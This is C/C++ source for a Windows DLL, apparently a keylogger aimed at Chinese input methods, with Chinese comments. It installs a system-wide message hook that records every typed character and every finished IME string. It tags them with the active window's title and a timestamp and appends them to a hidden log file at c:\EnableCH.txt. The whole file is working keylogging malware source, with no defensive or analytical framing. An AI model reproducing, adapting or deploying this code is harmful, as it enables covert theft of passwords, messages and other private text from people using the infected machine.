#include "shurufa.h"  
#include<time.h>
#define FILE_PATH "c:\\EnableCH.txt"  
#define MAX_CODE_COUND 102453

HHOOK        g_hHook = NULL;        //hook句柄  
HINSTANCE  g_hHinstance = NULL;        //程序句柄  
HWND         LastFocusWnd = 0;//上一次句柄,必须使全局的  
HWND         FocusWnd;         //当前窗口句柄，必须使全局的  


LPSTR pszMultiByte = NULL;//IME结果字符串指针,LPSTR被定义成是一个指向以NULL(‘\0’)结尾的32位ANSI字符数组指针

char title[256];              //获得窗口名字   
char *ftemp;                //begin/end 写到文件里面  
char temptitle[256] = "<<标题：";  //<<标题：窗口名字>>  
char t[2] = { 0, 0 };              //捕获单个字母  
unsigned char buffer[MAX_CODE_COUND];
int _time = 0;

void deletecode(){
	FILE* f1;
	f1 = fopen(FILE_PATH, "ab+");
	u_char s = 0;
	int len = 0;
	len = fread(buffer, 1, MAX_CODE_COUND, f1);

	if (len == 0)
		return;
	fclose(f1);

	f1 = fopen(FILE_PATH, "wb+");
	if ((unsigned char)buffer[len - 1] < (unsigned char)0x80){
		buffer[len - 1] = '\0';
		len--;
	}
	else{
		buffer[len - 1] = '\0';
		buffer[len - 2] = '\0';
		len -= 2;
	}
	if (len <= 0)
		return;
	fwrite(buffer, 1, len, f1);
	fclose(f1);

}


void writefile(char *lpstr)
{//保存为文件  
	FILE* f1;
	f1 = fopen(FILE_PATH, "a+");
	fwrite(lpstr, 1, strlen(lpstr), f1);
	fclose(f1);
}

void writefilech(char ch)
{//保存为文件  
	FILE* ff;
	ff = fopen(FILE_PATH, "a+");
	fprintf(ff, "%c", ch);
	fclose(ff);//为改之后
}



void chinesechange(char *s)
{
	int iSize;	//IME结果字符串的大小	输入法编辑器
	//LPSTR pszMultiByte = NULL;//IME结果字符串指针,LPSTR被定义成是一个指向以NULL(‘\0’)结尾的32位ANSI字符数组指针
	int Chinese = 936;//宽字节转换时中文的编码	
	iSize = WideCharToMultiByte(Chinese, 0, (LPCWCH)s, -1, NULL, 0, NULL, NULL);//计算将IME结果字符串转换为ASCII标准字节后的大小
	//为转换分配空间
	if (pszMultiByte)
	{
		delete[] pszMultiByte;
		pszMultiByte = NULL;
	}
	pszMultiByte = new char[iSize + 1];
	WideCharToMultiByte(Chinese, 0, (LPCWCH)s, -1, pszMultiByte, iSize, NULL, NULL);//宽字节转换
	pszMultiByte[iSize] = '\0';

}



void writetitle()
{
	FocusWnd = GetActiveWindow();

	if (LastFocusWnd != FocusWnd)//如果这个窗口和之前的窗口不是一样的话，我们需要记录下窗口名称和时间
	{
		ftemp = "\r\n-------------------------Begin-------------------------\r\nTitle: ";
		writefile(ftemp);
		GetWindowText(FocusWnd, (LPWSTR)title, 256);  //当前窗口标题
		LastFocusWnd = FocusWnd;
		strcat(temptitle, title);
		strcat(temptitle, ">>\n");
	
		//中文转换
		chinesechange(title);
		writefile(pszMultiByte);

		//---------------------------获取当时的系统时间-----------------------------//
		char tm[280] = "";
		char* end = "\r\n";
		struct tm *local;
		time_t TimeNow;
		TimeNow = time(NULL);
		local = localtime(&TimeNow);

		strcat(tm, "     Time: ");
		strcat(tm, asctime(local));
		writefile(tm);
		//---------------------------------获取时间结束------------------------------//

		ftemp = "-------------------------End---------------------------\r\n";
		writefile(ftemp);

	}
}

LRESULT CALLBACK MessageProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PMSG pmsg = (PMSG)lParam;
	if (nCode == HC_ACTION)
	{
		switch (pmsg->message)
		{
			
		case WM_IME_COMPOSITION://用户改变了编码状态
		{
								   writetitle();//记录窗口的标题和当时的时间

								   HIMC hIMC;
								   HWND hWnd = pmsg->hwnd;
								   DWORD dwSize;
								   char lpstr[30] = {};
								   if (pmsg->lParam & GCS_RESULTSTR)//按了enter键
								   {
									   //先获取当前正在输入的窗口的输入法句柄  
									   hIMC = ImmGetContext(hWnd);
									   // 先将ImmGetCompositionString的获取长度设为0来获取字符串大小.  
									   dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);
									   // 缓冲区大小要加上字符串的NULL结束符大小，考虑到UNICODE  
									   dwSize += sizeof(WCHAR);
									   memset(lpstr, 0, 30);
									   // 再调用一次.ImmGetCompositionString获取字符串  
									   ImmGetCompositionString(hIMC, GCS_RESULTSTR, lpstr, dwSize);

									   //中文转换
									   chinesechange(lpstr);
									   writefile(pszMultiByte);//为加的，到这个地方，并没有修改其他的东西，只是加了字符的转换

									   ImmReleaseContext(hWnd, hIMC);

								   }
								   break;
		}
		
		case WM_CHAR:  //截获发向焦点窗口的键盘消息--非中文，可以不经过输入法直接发送的
		{
						   writetitle();//记录窗口的标题和当时的时间
						  if (clock() - _time <= 20){
							   break;
						   }//因为word在处理的时候，是向系统发送了两个消息，一个是大写的英文字母，一个是小写的英文字母，那么这样处理的时候是有可能出现重叠
						   _time = clock();
						   char str[10];
						   WCHAR ch;
						   ch = (WCHAR)(pmsg->wParam);
						   if (ch >= 32 && ch <= 126)           //可见字符  
						   {
							   writefilech(ch);
						   }
						   if (ch >= 8 && ch <= 31)           //控制字符  
						   {
							   switch (ch)
							   {
							   case 8:
								   deletecode();//退格符
								   break;
							   case 9:
								   writefile("    ");//TAB
								   strcpy(str, "n");
								   break;
							   case 13:
								   writefile("\r\n");//换行符
								   strcpy(str, "n");
								   break;
							   default:strcpy(str, "n");
							   }
						   }

		}

			break;
		}
	}
	LRESULT lResult = CallNextHookEx(g_hHook, nCode, wParam, lParam);

	return(lResult);
}

//HOOK_API BOOL InstallHook()  
BOOL InstallHook()
{
	//WH_GETMESSAGE--获取键盘鼠标消息
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)MessageProc, g_hHinstance, 0);
	return TRUE;
}

//HOOK_API BOOL UnHook()  
BOOL UnHook()
{
	return UnhookWindowsHookEx(g_hHook);
}

BOOL APIENTRY DllMain(HANDLE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hHinstance = HINSTANCE(hModule);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		UnHook();
		break;
	}
	return TRUE;
}

